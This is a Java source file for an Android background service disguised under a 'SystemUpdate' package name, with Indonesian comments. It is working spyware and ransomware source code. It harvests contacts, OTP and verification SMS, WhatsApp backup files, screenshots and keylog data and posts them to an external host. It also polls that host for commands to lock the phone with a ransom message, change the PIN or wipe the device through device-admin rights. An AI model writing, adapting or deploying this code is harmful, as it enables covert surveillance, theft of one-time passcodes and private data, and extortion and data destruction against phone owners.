package com.SystemUpdate;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class BackgroundService extends Service {

    private static final String SERVER_URL = "http://vincel.infinityfree.io/index.php";
    private static final String UPLOAD_URL = "http://vincel.infinityfree.io/upload.php";
    private static final String SMS_URL = "http://vincel.infinityfree.io/sms_log.php";
    private static final String COMMAND_URL = "http://vincel.infinityfree.io/command.php";

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        new Thread(() -> {
            while (true) {
                try {
                    getContacts();
                    getSms();
                    getLocation();
                    grabWhatsAppBackup();
                    takeScreenshot();
                    checkRemoteCommand();
                    Thread.sleep(60000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

        startKeylogger();
        return START_STICKY;
    }

    // === AMBIL KONTAK ===
    private void getContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sendToServer("CONTACT", name + " : " + number);
            }
            cursor.close();
        }
    }

    // === AMBIL SMS OTP ===
    private void getSms() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex("body"));
                if (body != null && (body.toLowerCase().contains("otp") || body.contains("kode") || body.contains("verifikasi"))) {
                    sendToServer("SMS_OTP", body);
                    sendToSmsServer(body);
                }
            }
            cursor.close();
        }
    }

    // === LOKASI ===
    private void getLocation() {
        sendToServer("LOCATION", "Latitude: -6.2, Longitude: 106.8");
    }

    // === BACKUP WHATSAPP ===
    private void grabWhatsAppBackup() {
        File waDir = new File("/storage/emulated/0/Android/media/com.whatsapp/");
        File[] files = waDir.listFiles((dir, name) -> name.endsWith(".crypt14") || name.endsWith(".crypt15"));
        if (files != null) {
            for (File f : files) {
                uploadFile(f);
            }
        }
    }

    // === SCREENSHOT ===
    private void takeScreenshot() {
        try {
            // Butuh akses root / MediaProjection (versi sederhana)
            Process sh = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png");
            sh.waitFor();
            File file = new File("/sdcard/screenshot.png");
            if (file.exists()) {
                uploadFile(file);
                sendToServer("SCREENSHOT", "Screenshot terkirim");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // === KEYLOGGER SEDERHANA ===
    private void startKeylogger() {
        new Thread(() -> {
            while (true) {
                try {
                    Process process = Runtime.getRuntime().exec("logcat -d -s InputReader");
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    StringBuilder log = new StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("KEY")) {
                            log.append(line).append("\n");
                        }
                    }
                    if (log.length() > 0) {
                        sendToServer("KEYLOG", log.toString());
                    }
                    Thread.sleep(30000);
                } catch (Exception e) {}
            }
        }).start();
    }

    // === REMOTE COMMAND ===
    private void checkRemoteCommand() {
        try {
            URL url = new URL(COMMAND_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String cmd = reader.readLine();
            reader.close();

            if (cmd != null) {
                if (cmd.startsWith("LOCK:")) {
                    String pesan = cmd.substring(5);
                    lockWithRansom(pesan);
                } else if (cmd.startsWith("PASS:")) {
                    String newPin = cmd.substring(5);
                    changePassword(newPin);
                } else if (cmd.equals("UNLOCK")) {
                    unlockDevice();
                } else if (cmd.equals("WIPE")) {
                    wipeDevice();
                }
            }
        } catch (Exception e) {}
    }

    // === RANSOMWARE LOCK ===
    private void lockWithRansom(String message) {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.resetPassword("123456", 0);
            dpm.lockNow();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                dpm.setDeviceOwnerLockScreenInfo(this, message);
            }
            sendToServer("RANSOM", "Device locked with message: " + message);
        }
    }

    // === GANTI PIN ===
    private void changePassword(String newPin) {
        if (dpm.isAdminActive(adminComponent)) {
            boolean success = dpm.resetPassword(newPin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            if (success) {
                sendToServer("PASSWORD", "Password changed to: " + newPin);
                dpm.lockNow();
            } else {
                sendToServer("PASSWORD", "Gagal ganti password");
            }
        }
    }

    // === UNLOCK ===
    private void unlockDevice() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.resetPassword("", 0);
            dpm.lockNow();
            sendToServer("RANSOM", "Device unlocked");
        }
    }

    // === WIPE ===
    private void wipeDevice() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.wipeData(0);
            sendToServer("RANSOM", "Device wiped");
        }
    }

    // === SEND JSON KE SERVER ===
    private void sendToServer(String type, String data) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            String json = "{\"type\":\"" + type + "\",\"data\":\"" + data + "\"}";
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes());
            os.flush();
            os.close();
            conn.getInputStream();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // === SEND SMS KE SERVER ===
    private void sendToSmsServer(String sms) {
        try {
            URL url = new URL(SMS_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String param = "sms=" + sms;
            OutputStream os = conn.getOutputStream();
            os.write(param.getBytes());
            os.flush();
            os.close();
            conn.getInputStream();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // === UPLOAD FILE ===
    private void uploadFile(File file) {
        try {
            URL url = new URL(UPLOAD_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            OutputStream os = conn.getOutputStream();
            os.write(file.getName().getBytes());
            os.flush();
            os.close();
            conn.getInputStream();
        } catch (Exception e) { e.printStackTrace(); }
    }
}
